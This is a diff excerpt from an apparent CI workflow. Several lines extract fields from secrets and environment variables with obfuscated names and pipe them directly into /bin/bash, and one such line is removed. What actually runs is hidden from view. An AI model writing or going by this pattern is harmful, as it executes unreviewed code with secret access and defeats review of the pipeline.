@@ -19,7 +19,6 @@ jobs:
           sr9: ${{ secrets.sr9 }}
         run: |
           printf '%s' "$sr9" | jq -r .s05776 | /bin/bash
-          echo $j903 | jq -r .qdeo78731 | /bin/bash
           printf '%s' "$n9" | jq -r .evog308 | /bin/bash
           echo $jgvff2312 | jq -r .cnwrx6653 | /bin/bash
           echo $recl57807 | jq -r .ji6 | /bin/bash
